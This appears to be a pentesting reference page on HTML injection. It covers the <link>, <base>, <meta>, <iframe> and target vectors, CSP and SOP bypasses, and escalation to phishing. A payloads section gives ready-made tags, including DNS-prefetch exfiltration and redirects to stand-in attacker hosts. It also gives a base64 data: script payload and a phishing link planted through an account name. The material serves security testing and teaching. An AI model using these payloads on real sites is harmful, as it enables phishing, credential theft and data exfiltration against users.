## Overview

HTML Injection (also known as HTML tag injection) occurs when an attacker can insert arbitrary HTML elements or attributes into a web page or email, potentially altering its structure, behavior, or content. This can lead to issues like open redirects, data exfiltration, JavaScript execution, or phishing. Common vectors include injecting tags like `<link>`, `<base>`, `<meta>`, `<iframe>`, or attributes like `target`, often in user-controlled inputs such as account names, URLs, or metadata. While typically low to medium severity, it can escalate to higher impact through chaining with other vulnerabilities.

## Exploitation Methods

### `<link>` Tag
The `<link>` HTML element specifies relationships between the current document and an external resource, commonly used for stylesheets or icons.

#### rel=dns-prefetch for Data Exfiltration
- This keyword hints to browsers to preemptively resolve DNS for a target origin, allowing data exfil in subdomains even with restrictive CSP `connect-src` directives.
- Steps:
  - Identify injectable locations (e.g., misconfigured VSCode extensions or HTML inputs).
  - Inject the tag to encode data in subdomains.
- Example: Exfiltrate data like IP addresses via DNS resolution.

References:
- [Trail of Bits Blog: Escaping misconfigured VSCode extensions](https://blog.trailofbits.com/2023/02/21/vscode-extension-escape-vulnerability/)

### <base> Tag
The `<base>` element specifies the base URL for all relative URLs in a document. Only the first `href` and `target` are used if multiple exist.

#### Relative URL Redirection
- Allows redirecting relative URLs to an arbitrary host, potentially injecting arbitrary JavaScript via relative script sources.
- Steps:
  - Find a page with relative resource links (e.g., scripts like `/assets/some-script.js`).
  - Inject `<base>` to point to attacker-controlled domain.
- Example: Browser requests script from attacker site, enabling JS injection.

### <meta> Tag
The `<meta>` tag represents metadata, some of which affect page behavior (e.g., via `http-equiv`). CSP does not regulate `<meta>` elements.

#### http-equiv Functions
- `set-cookie`: Removed from standards; no longer supported in Firefox 68+ or Chrome 65+.
- `refresh`: Enables redirects to regular or `data:` URLs.

#### Using data: Scheme for JavaScript Execution
- Executes arbitrary JS via `data:` URI in `refresh` (Safari only; blocked in Firefox/Chrome due to top-frame navigation restrictions).
- Steps:
  - Inject `<meta>` with base64-encoded JS in `data:` URI.
  - Test on Safari for execution.

#### Open Redirect
- Redirect users to arbitrary pages via timed refresh.
- Steps:
  - Inject `<meta>` with `content` specifying delay and URL.
  - Chain with other tags for SSRF or phishing.

References:
- [&lt;meta&gt; and &lt;iframe&gt; tags chained to SSRF](https://medium.com/@know.0nix/hunting-good-bugs-with-only-html-d8fd40d17b38)

### <iframe> Tag
The `<iframe>` embeds another HTML document. Cross-origin iframes are restricted by SOP unless sandboxed.

#### Open Redirect via Cross-Origin Location Manipulation
- Child documents can set `top.window.location` even cross-origin, bypassing SOP if not sandboxed.
- Steps:
  - Inject `<iframe>` pointing to attacker-controlled page.
  - In the child page, use script to redirect parent.
- Example: Parent redirects to attacker site upon iframe load.
- Chain with `<meta>` for SSRF.

References:
- [&lt;meta&gt; and &lt;iframe&gt; tags chained to SSRF](https://medium.com/@know.0nix/hunting-good-bugs-with-only-html-d8fd40d17b38)

### target Attribute
The `target` attribute on links specifies browsing context for URLs (e.g., `_self`, `_blank`, `_parent`, `_top`).

#### _blank Vulnerability
- Opens links in new tab/window but allows partial access via `window.opener`, enabling phishing or JS execution on opener.
- In newer browsers (e.g., Firefox 79+), `target="_blank"` implicitly behaves like `rel="noopener"`.
- Steps:
  - Identify links with injectable `target="_blank"`.
  - Use to redirect opener to phishing page.

References:
- [Target="_blank" — the most underestimated vulnerability ever](https://medium.com/@jitbit/target-blank-the-most-underestimated-vulnerability-ever-96e328301f4c)

### HTML Injection in Password Reset Pages/Emails
Password reset links often include account names; if names allow tags/special characters, injection occurs.

#### Steps
1. Create an account.
2. Edit name to include HTML (e.g., `<h1>attacker</h1>` or `"abc><h1>attacker</h1>`).
3. Request password reset and check email.
4. Observe tag execution in email.

Author: [@C1pher15](https://twitter.com/C1pher15)

## Bypasses

- **CSP Bypass with <link rel="dns-prefetch">**: Exfiltrates data in subdomains despite restrictive `connect-src`.
- **SOP Bypass with <iframe>**: Non-sandboxed iframes allow cross-origin parent location changes.
- **Browser-Specific Bypasses**: `data:` URI JS execution works only in Safari; `set-cookie` via `<meta>` obsolete in modern Firefox/Chrome.

## Payloads

1. DNS Prefetch Exfil (via <link>):
   ```html:disable-run
   <link rel="dns-prefetch" href="//AAA.BBB.CCC.DDD.attacker.webserver.com">
   ```

2. Relative URL Redirect (via <base>):
   ```html
   <base href="https://attacker-website.com">
   ```

3. JS Execution via data: (via <meta>, Safari-only):
   ```html
   <meta name="language" content="0;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" http-equiv="refresh"/>
   ```

4. Open Redirect (via <meta>):
   ```html
   <meta name="language" content="5;http://malicious-website.com" http-equiv="refresh"/>
   ```

5. Open Redirect via <iframe> (inject on vulnerable site):
   ```html
   <iframe src="//malicious-website.com/toplevel.html"></iframe>
   ```
   (Where `toplevel.html` contains: `<script>top.window.location = "https://malicious-website.com/pwned.html"</script>`)

6. HTML in Account Name (for emails):
   ```html
   <h1>attacker</h1>
   ```

7. Malicious Link in Account Name:
   ```html
   <h1>attacker</h1><a href="your-controlled-domain">Click here</a>
   ```

## Higher Impact

- **Escalation via Malicious Links/Redirects**: Use injected `<a href>` in emails to redirect to fake reset pages, steal credentials, or exploit known XSS for cookie theft.
- **Chaining Attacks**: Combine `<meta>` redirects with `<iframe>` for SSRF; use `<base>` for JS injection from relative paths; leverage `target="_blank"` for opener hijacking/phishing.
- **Data Exfiltration**: Encode sensitive data (e.g., IPs) in DNS prefetches.
- **Phishing/Credential Theft**: Redirect to attacker-controlled domains serving fake pages.
- **Severity Escalation**: From low/medium to high by enabling XSS, theft, or infrastructure access. Creativity in chaining determines impact (e.g., serve XSS payloads via redirects).
